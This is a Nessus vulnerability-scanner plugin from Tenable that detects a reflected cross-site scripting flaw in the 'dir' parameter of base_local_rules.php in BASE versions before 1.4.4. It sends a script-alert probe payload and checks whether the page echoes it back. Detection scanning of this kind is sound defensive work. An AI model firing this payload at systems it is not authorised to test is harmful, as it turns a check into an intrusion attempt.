#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(42264);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(36830);
  script_xref(name:"Secunia", value:"37147");

  script_name(english:"BASE < 1.4.4 'dir' Parameter Cross-Site Scripting");
  script_summary(english:"Attempts a non-persistent XSS attack");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "A web application on the remote host has a cross-site scripting\n",
      "vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description",
    value:string(
      "The version of Basic Analysis and Security Engine (BASE) running on\n",
      "the remote host has a cross-site scripting vulnerability.  Input to\n",
      "the 'dir' parameter of base_local_rules.php is not properly\n",
      "sanitized.  A remote attacker could exploit this by tricking a user\n",
      "into requesting a maliciously crafted URL."
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?86a77f0c"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to BASE 1.4.4 or later."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N"
  );
  script_set_attribute(
    attribute:"vuln_publication_date",
    value:"2009/08/11"
  );
  script_set_attribute(
    attribute:"patch_publication_date",
    value:"2009/08/11"
  );
  script_set_attribute(
    attribute:"plugin_publication_date",
    value:"2009/10/27"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

if (thorough_tests) dirs = list_uniq(make_list("/base", cgi_dirs()));
else dirs = make_list(cgi_dirs());

xss = string("<script>alert('", SCRIPT_NAME, "-", unixtime(), "')</script>");
expected_output = string('"', xss, '" does not exist');

exploited = test_cgi_xss(
  port:port,
  dirs:dirs,
  cgi:"/base_local_rules.php",
  qs:"dir=" + xss,
  pass_str:expected_output,
  ctrl_re:'ERROR: Directory "<script>alert'
);
  
if (!exploited)
  exit(1, "Nessus did not detect a vulnerable BASE install on port " + port);
